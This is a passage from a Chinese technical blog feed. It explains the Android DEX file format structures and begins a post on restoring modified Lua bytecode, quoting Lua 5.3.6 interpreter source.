<span class="comment">/* 指向DexStringId列表的索引 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">02 00 00 00 05 00 00 00 08 00 00 00 09 00 00 00</span><br><span class="line">0A 00 00 00 0B 00 00 00 0C 00 00 00 0F 00 00 00</span><br><span class="line">12 00 00 00</span><br></pre></td></tr></table></figure><p>数字代表的就是字符串的索引</p><p>例如</p><p><code>02 00 00 00</code>就代表索引2的字符串也就是<code>I</code>, int型</p><p><img src="C:\Users\Aichengchao\AppData\Roaming\Typora\typora-user-images\image-20250305143520029.png" alt="image-20250305143520029"></p><h1 id="proto-id"><a href="#proto-id" class="headerlink" title="proto_id"></a>proto_id</h1><p><strong>proto_ids_size</strong></p><p>描述proto_id的个数</p><p><strong>proto_ids_off</strong></p><p>指向proto_ids的偏移</p><p>每一个proto_id的定义如下,用于描述一个方法原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">DexProtoId</span>&#123;</span> </span><br><span class="line"> u4 shortyIdx;   <span class="comment">/*指向DexStringId列表的索引*/</span> </span><br><span class="line"> u4 returnTypeIdx;  <span class="comment">/*指向DexTypeId列表的索引*/</span> </span><br><span class="line"> u4 parametersOff;  <span class="comment">/*指向DexTypeList的位置偏移*/</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>第一个字段是一个索引, 对应字符串中一个能描述方法的字符串</p><p>例如<code>III</code>表示<code>int (int, int)</code></p></li><li><p>第二个字段就是返回值类型的类型索引</p></li><li><p>第三个字段是指向一个DexTypeList的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeList</span> &#123;</span></span><br><span class="line">    u4  size;               <span class="comment">/* 接下来DexTypeItem的个数 */</span></span><br><span class="line">    DexTypeItem <span class="built_in">list</span>[size];    <span class="comment">/* DexTypeItem结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTypeItem</span> &#123;</span></span><br><span class="line">    u2  typeIdx;            <span class="comment">/* 指向DexTypeId列表的索引 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>例如<code>02 00 00 00 00 00 00 00</code>代表</p><p>共有两个参数, 都位于类型索引表的<code>0</code>处, 也就是<code>int, int</code></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-05_144459.png" alt=""></p><h1 id="field-id"><a href="#field-id" class="headerlink" title="field_id"></a>field_id</h1><p><strong>field_ids_size</strong></p><p>描述DexFieldId的个数</p><p><strong>field_ids_off</strong></p><p>描述DexFieldId所在偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFieldId</span> &#123;</span></span><br><span class="line">    u2  classIdx;           <span class="comment">/* 类的类型，指向DexTypeId列表的索引 */</span></span><br><span class="line">    u2  typeIdx;            <span class="comment">/* 字段类型，指向DexTypeId列表的索引 */</span></span><br><span class="line">    u4  nameIdx;            <span class="comment">/* 字段名，指向DexStringId列表的索引 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>第一个字段代表所属类</li><li>第二个字段代表类型</li><li>第三个字段对应字符串表中的索引, 是字段的名称</li></ol><p>例如<code>01 00 00 00 17 00 00 00</code>代表Hello.number字段, 其是一个int</p><p><img src="C:\Users\Aichengchao\AppData\Roaming\Typora\typora-user-images\image-20250305145055947.png" alt="image-20250305145055947"></p><h1 id="method-id"><a href="#method-id" class="headerlink" title="method_id"></a>method_id</h1><p><strong>method_ids_size</strong></p><p>method_id的个数</p><p><strong>method_ids_off</strong></p><p>所在偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethodId</span> &#123;</span></span><br><span class="line">    u2  classIdx;           <span class="comment">/* 类的类型，指向DexTypeId列表的索引 */</span></span><br><span class="line">    u2  protoIdx;           <span class="comment">/* 声明类型，指向DexProtoId列表的索引 */</span></span><br><span class="line">    u4  nameIdx;            <span class="comment">/* 方法名，指向DexStringId列表的索引 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li>第一个字段代表所属类索引</li><li>第二个字段代表方法原型声明索引</li><li>第三个字段代表方法名字</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-05_145354.png" alt=""></p><h1 id="class-def"><a href="#class-def" class="headerlink" title="class_def"></a>class_def</h1><p>整个dex最复杂也是最关键的地方</p><p><strong>class_defs_size</strong></p><p>描述DexClassDef的个数</p><p><strong>class_defs_off</strong></p><p>DexClassDef结构所在偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDef</span> &#123;</span></span><br><span class="line">    u4  classIdx;           <span class="comment">/* 类的类型，指向DexTypeId列表的索引 */</span></span><br><span class="line">    u4  accessFlags;        <span class="comment">/* accessFlags是类的访问标志，以ACC_开头的一个枚举值 */</span></span><br><span class="line">    u4  superclassIdx;      <span class="comment">/* 父类类型，指向DexTypeId列表的索引 */</span></span><br><span class="line">    u4  interfacesOff;      <span class="comment">/* 接口，指向DexTypeList的偏移 */</span></span><br><span class="line">    u4  sourceFileIdx;      <span class="comment">/* 源文件名，指向DexStringId列表的索引 */</span></span><br><span class="line">    u4  annotationsOff;     <span class="comment">/* 注解，指向DexAnnotationsDirectoryItem结构 annotationsOff字段指向注解目录结构，根据类型不同会有注解类、注解方法、注解字段与注解参数*/</span></span><br><span class="line">    u4  classDataOff;       <span class="comment">/* 指向DexClassData结构的偏移 classDataOff字段是类的数据部分*/</span></span><br><span class="line">    u4  staticValuesOff;    <span class="comment">/* 指向DexEncodedArray结构的偏移 staticValuesOff字段记录类中的静态数据*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>访问标志枚举</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* accessFlags 访问标志 */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    ACC_PUBLIC       = <span class="number">0x00000001</span>,       <span class="comment">// class, field, method, ic</span></span><br><span class="line">    ACC_PRIVATE      = <span class="number">0x00000002</span>,       <span class="comment">// field, method, ic</span></span><br><span class="line">    ACC_PROTECTED    = <span class="number">0x00000004</span>,       <span class="comment">// field, method, ic</span></span><br><span class="line">    ACC_STATIC       = <span class="number">0x00000008</span>,       <span class="comment">// field, method, ic</span></span><br><span class="line">    ACC_FINAL        = <span class="number">0x00000010</span>,       <span class="comment">// class, field, method, ic</span></span><br><span class="line">    ACC_SYNCHRONIZED = <span class="number">0x00000020</span>,       <span class="comment">// method (only allowed on natives)</span></span><br><span class="line">    ACC_SUPER        = <span class="number">0x00000020</span>,       <span class="comment">// class (not used in Dalvik)</span></span><br><span class="line">    ACC_VOLATILE     = <span class="number">0x00000040</span>,       <span class="comment">// field</span></span><br><span class="line">    ACC_BRIDGE       = <span class="number">0x00000040</span>,       <span class="comment">// method (1.5)</span></span><br><span class="line">    ACC_TRANSIENT    = <span class="number">0x00000080</span>,       <span class="comment">// field</span></span><br><span class="line">    ACC_VARARGS      = <span class="number">0x00000080</span>,       <span class="comment">// method (1.5)</span></span><br><span class="line">    ACC_NATIVE       = <span class="number">0x00000100</span>,       <span class="comment">// method</span></span><br><span class="line">    ACC_INTERFACE    = <span class="number">0x00000200</span>,       <span class="comment">// class, ic</span></span><br><span class="line">    ACC_ABSTRACT     = <span class="number">0x00000400</span>,       <span class="comment">// class, method, ic</span></span><br><span class="line">    ACC_STRICT       = <span class="number">0x00000800</span>,       <span class="comment">// method</span></span><br><span class="line">    ACC_SYNTHETIC    = <span class="number">0x00001000</span>,       <span class="comment">// field, method, ic</span></span><br><span class="line">    ACC_ANNOTATION   = <span class="number">0x00002000</span>,       <span class="comment">// class, ic (1.5)</span></span><br><span class="line">    ACC_ENUM         = <span class="number">0x00004000</span>,       <span class="comment">// class, field, ic (1.5)</span></span><br><span class="line">    ACC_CONSTRUCTOR  = <span class="number">0x00010000</span>,       <span class="comment">// method (Dalvik only)</span></span><br><span class="line">    ACC_DECLARED_SYNCHRONIZED =<span class="number">0x00020000</span>,       <span class="comment">// method (Dalvik only)</span></span><br><span class="line">    ACC_CLASS_MASK =(ACC_PUBLIC | ACC_FINAL | ACC_INTERFACE | ACC_ABSTRACT| ACC_SYNTHETIC | ACC_ANNOTATION | ACC_ENUM),</span><br><span class="line">    ACC_INNER_CLASS_MASK =(ACC_CLASS_MASK | ACC_PRIVATE | ACC_PROTECTED | ACC_STATIC),</span><br><span class="line">    ACC_FIELD_MASK =(ACC_PUBLIC | ACC_PRIVATE | ACC_PROTECTED | ACC_STATIC | ACC_FINAL| ACC_VOLATILE | ACC_TRANSIENT | ACC_SYNTHETIC | ACC_ENUM),</span><br><span class="line">    ACC_METHOD_MASK =(ACC_PUBLIC | ACC_PRIVATE | ACC_PROTECTED | ACC_STATIC | ACC_FINAL | ACC_SYNCHRONIZED | ACC_BRIDGE | ACC_VARARGS | ACC_NATIVE | ACC_ABSTRACT | ACC_STRICT | ACC_SYNTHETIC | ACC_CONSTRUCTOR| ACC_DECLARED_SYNCHRONIZED),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="annotations"><a href="#annotations" class="headerlink" title="annotations"></a>annotations</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexAnnotationSetItem</span> &#123;</span></span><br><span class="line">    u4  size;</span><br><span class="line">    u4  entries[<span class="number">1</span>];                 <span class="comment">/* 指向DexAnnotationItem结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexFieldAnnotationsItem</span> &#123;</span></span><br><span class="line">    u4  fieldIdx;</span><br><span class="line">    u4  annotationsOff;             <span class="comment">/* 指向DexAnnotationSetItem结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethodAnnotationsItem</span> &#123;</span></span><br><span class="line">    u4  methodIdx;</span><br><span class="line">    u4  annotationsOff;             <span class="comment">/* 指向DexAnnotationSetItem结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexParameterAnnotationsItem</span> &#123;</span></span><br><span class="line">    u4  methodIdx;</span><br><span class="line">    u4  annotationsOff;             <span class="comment">/* 指向DexAnotationSetRefList结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexAnnotationSetRefList</span> &#123;</span></span><br><span class="line">    u4  size;</span><br><span class="line">    DexAnnotationSetRefItem <span class="built_in">list</span>[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexAnnotationSetRefItem</span> &#123;</span></span><br><span class="line">    u4  annotationsOff;             <span class="comment">/* 指向DexAnnotationSetItem结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexAnnotationItem</span> &#123;</span></span><br><span class="line">    u1  visibility;</span><br><span class="line">    u1  annotation[<span class="number">1</span>];              </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    kDexVisibilityBuild         = <span class="number">0x00</span>,     </span><br><span class="line">    kDexVisibilityRuntime       = <span class="number">0x01</span>,</span><br><span class="line">    kDexVisibilitySystem        = <span class="number">0x02</span>,</span><br><span class="line"></span><br><span class="line">    kDexAnnotationByte          = <span class="number">0x00</span>,</span><br><span class="line">    kDexAnnotationShort         = <span class="number">0x02</span>,</span><br><span class="line">    kDexAnnotationChar          = <span class="number">0x03</span>,</span><br><span class="line">    kDexAnnotationInt           = <span class="number">0x04</span>,</span><br><span class="line">    kDexAnnotationLong          = <span class="number">0x06</span>,</span><br><span class="line">    kDexAnnotationFloat         = <span class="number">0x10</span>,</span><br><span class="line">    kDexAnnotationDouble        = <span class="number">0x11</span>,</span><br><span class="line">    kDexAnnotationString        = <span class="number">0x17</span>,</span><br><span class="line">    kDexAnnotationType          = <span class="number">0x18</span>,</span><br><span class="line">    kDexAnnotationField         = <span class="number">0x19</span>,</span><br><span class="line">    kDexAnnotationMethod        = <span class="number">0x1a</span>,</span><br><span class="line">    kDexAnnotationEnum          = <span class="number">0x1b</span>,</span><br><span class="line">    kDexAnnotationArray         = <span class="number">0x1c</span>,</span><br><span class="line">    kDexAnnotationAnnotation    = <span class="number">0x1d</span>,</span><br><span class="line">    kDexAnnotationNull          = <span class="number">0x1e</span>,</span><br><span class="line">    kDexAnnotationBoolean       = <span class="number">0x1f</span>,</span><br><span class="line"></span><br><span class="line">    kDexAnnotationValueTypeMask = <span class="number">0x1f</span>,     </span><br><span class="line">    kDexAnnotationValueArgShift = <span class="number">5</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="class-data"><a href="#class-data" class="headerlink" title="class_data"></a>class_data</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* classDataOff */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassData</span> &#123;</span></span><br><span class="line">    DexClassDataHeader header;        <span class="comment">//指定字段与方法的个数</span></span><br><span class="line">    DexField*          staticFields;  <span class="comment">//静态字段，DexField结构</span></span><br><span class="line">    DexField*          instanceFields;<span class="comment">//实例字段，DexField结构</span></span><br><span class="line">    DexMethod*         directMethods; <span class="comment">//直接方法，DexMethod结构</span></span><br><span class="line">    DexMethod*         virtualMethods;<span class="comment">//虚方法，DexMethod结构</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* DexClassDataHeader结构记录了当前类中字段与方法的数目 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexClassDataHeader</span> &#123;</span></span><br><span class="line">    u4 staticFieldsSize; <span class="comment">//静态字段个数</span></span><br><span class="line">    u4 instanceFieldsSize; <span class="comment">//实例字段个数</span></span><br><span class="line">    u4 directMethodsSize; <span class="comment">//直接方法个数</span></span><br><span class="line">    u4 virtualMethodsSize; <span class="comment">//虚方法个数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* DexField结构描述了字段的类型与访问标志 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexField</span> &#123;</span></span><br><span class="line">    u4 fieldIdx;    <span class="comment">/* 指向DexFieldId的索引 */</span></span><br><span class="line">    u4 accessFlags; <span class="comment">/* 访问标志 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* DexMethod结构描述方法的原型、名称、访问标志以及代码数据块 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexMethod</span> &#123;</span></span><br><span class="line">    u4 methodIdx;    <span class="comment">/* 指向DexMethodId的索引 */</span></span><br><span class="line">    u4 accessFlags;  <span class="comment">/* 访问标志 */</span></span><br><span class="line">    u4 codeOff;      <span class="comment">/* 指向DexCode结构的偏移 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexCode</span> &#123;</span></span><br><span class="line">    u2  registersSize;      <span class="comment">/* 使用的寄存器个数 .register*/</span></span><br><span class="line">    u2  insSize;<span class="comment">/* 参数个数 .paramter*/</span></span><br><span class="line">    u2  outsSize;<span class="comment">/* 调用其他方法时使用的寄存器个数 outsSize指定方法调用外部方法时使用的寄存器个数*/</span></span><br><span class="line">    u2  triesSize;<span class="comment">/* try/catch个数 */</span></span><br><span class="line">    u4  debugInfoOff;       <span class="comment">/* 指向调式信息的偏移 */</span></span><br><span class="line">    u4  insnsSize;          <span class="comment">/* 指令集个数，以2字节为单位 */</span></span><br><span class="line">    u2  insns[<span class="number">1</span>];<span class="comment">/* 指令集 */</span></span><br><span class="line">    <span class="comment">/* 2字节空间用于结构对齐 */</span></span><br><span class="line">    <span class="comment">/* try_item[triesSize] DexTry结构 */</span></span><br><span class="line">    <span class="comment">/*  try/catch中handler的个数 */</span></span><br><span class="line">    <span class="comment">/* catch_handler_item[handlersSize] DexCatchHandler结构 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexTry</span> &#123;</span></span><br><span class="line">    u4  startAddr;         </span><br><span class="line">    u2  insnCount;        </span><br><span class="line">    u2  handlerOff;        </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="staticValues"><a href="#staticValues" class="headerlink" title="staticValues"></a>staticValues</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DexEncodedArray</span> &#123;</span></span><br><span class="line">    u1  <span class="built_in">array</span>[<span class="number">1</span>];   </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义 Encoded Value 结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    ubyte value_type;</span><br><span class="line">    ubyte value[value_type_size(value_type)];</span><br><span class="line">&#125; EncodedValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 Encoded Array 结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    uleb128 size;</span><br><span class="line">    EncodedValue values[size];</span><br><span class="line">&#125; EncodedArray;</span><br></pre></td></tr></table></figure><h1 id="data"><a href="#data" class="headerlink" title="data"></a>data</h1><p>  <strong>data_size</strong></p><p>数据段大小  </p><p>  <strong>data_off</strong></p><p>数据段偏移  </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://source.android.com/docs/core/dalvik/dex-format?hl=zh-cn">Dalvik 可执行文件格式  | Android Open Source Project</a></p><p><a href="https://cs.android.com/android/platform/superproject/main/+/main:art/libdexfile/dex/dex_file.h">dex_file.h - Android Code Search</a></p>]]></content>
    
    
    <summary type="html">dex</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="android" scheme="https://ixout.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>还原魔改luac</title>
    <link href="https://ixout.github.io/posts/15971/"/>
    <id>https://ixout.github.io/posts/15971/</id>
    <published>2024-09-27T02:45:46.000Z</published>
    <updated>2024-11-20T14:11:46.245Z</updated>
    
    <content type="html"><![CDATA[<p>在IOT漏洞挖掘的过程中常常会遇到luci模式的cgi,其中多数都会对其进行编译为字节码,网络上已经有不少关于unluac的项目,例如<a href="https://sourceforge.net/projects/unluac/files/">unluac - Browse Files at SourceForge.net</a>,但是还有一些厂商会对luac进行魔改,这就使得一般的unluac失效</p><p>之前就曾尝试过学习恢复魔改luac,可惜一直没啥头绪,前段时间和学长交流了下,学长给了篇自己写的文章<a href="https://forum.butian.net/share/3744">奇安信攻防社区-还原iot设备中魔改的luac (butian.net)</a>,学习一下</p><p>关于lua虚拟机可以参考<a href="https://cloud.tencent.com/developer/article/1648925">深入理解 Lua 虚拟机-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>学长的文章中只展示了部分关键代码,所以还是自己需要自己阅读源码,以下代码无特殊标注皆选自lua5.3.6</p><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a><strong>main</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> status, result;</span><br><span class="line">  lua_State *L = luaL_newstate();  <span class="comment">/* create state */</span></span><br><span class="line">  <span class="keyword">if</span> (L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    l_message(argv[<span class="number">0</span>], <span class="string">&quot;cannot create state: not enough memory&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_pushcfunction(L, &amp;pmain);  <span class="comment">/* to call &#x27;pmain&#x27; in protected mode */</span></span><br><span class="line">  lua_pushinteger(L, argc);  <span class="comment">/* 1st argument */</span></span><br><span class="line">  lua_pushlightuserdata(L, argv); <span class="comment">/* 2nd argument */</span></span><br><span class="line">  status = lua_pcall(L, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);  <span class="comment">/* do the call */</span></span><br><span class="line">  result = lua_toboolean(L, <span class="number">-1</span>);  <span class="comment">/* get result */</span></span><br><span class="line">  report(L, status);</span><br><span class="line">  lua_close(L);</span><br><span class="line">  <span class="keyword">return</span> (result &amp;&amp; status == LUA_OK) ? EXIT_SUCCESS : EXIT_FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到只是一些初始化工作,创建lua状态机等</p><h3 id="pmain"><a href="#pmain" class="headerlink" title="pmain"></a><strong>pmain</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pmain</span> <span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">  <span class="type">int</span> argc = (<span class="type">int</span>)lua_tointeger(L, <span class="number">1</span>);</span><br><span class="line">  <span class="type">char</span> **argv = (<span class="type">char</span> **)lua_touserdata(L, <span class="number">2</span>);</span><br><span class="line">  <span class="type">int</span> script;</span><br><span class="line">  <span class="type">int</span> args = collectargs(argv, &amp;script);</span><br><span class="line">  luaL_checkversion(L);  <span class="comment">/* check that interpreter has correct version */</span></span><br><span class="line">  <span class="keyword">if</span> (argv[<span class="number">0</span>] &amp;&amp; argv[<span class="number">0</span>][<span class="number">0</span>]) progname = argv[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (args == has_error) &#123;  <span class="comment">/* bad arg? */</span></span><br><span class="line">    print_usage(argv[script]);  <span class="comment">/* &#x27;script&#x27; has index of bad arg. */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (args &amp; has_v)  <span class="comment">/* option &#x27;-v&#x27;? */</span></span><br><span class="line">    print_version();</span><br><span class="line">  <span class="keyword">if</span> (args &amp; has_E) &#123;  <span class="comment">/* option &#x27;-E&#x27;? */</span></span><br><span class="line">    lua_pushboolean(L, <span class="number">1</span>);  <span class="comment">/* signal for libraries to ignore env. vars. */</span></span><br><span class="line">    lua_setfield(L, LUA_REGISTRYINDEX, <span class="string">&quot;LUA_NOENV&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  luaL_openlibs(L);  <span class="comment">/* open standard libraries */</span></span><br><span class="line">  createargtable(L, argv, argc, script);  <span class="comment">/* create table &#x27;arg&#x27; */</span></span><br><span class="line">  <span class="keyword">if</span> (!(args &amp; has_E)) &#123;  <span class="comment">/* no option &#x27;-E&#x27;? */</span></span><br><span class="line">    <span class="keyword">if</span> (handle_luainit(L) != LUA_OK)  <span class="comment">/* run LUA_INIT */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* error running LUA_INIT */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!runargs(L, argv, script))  <span class="comment">/* execute arguments -e and -l */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  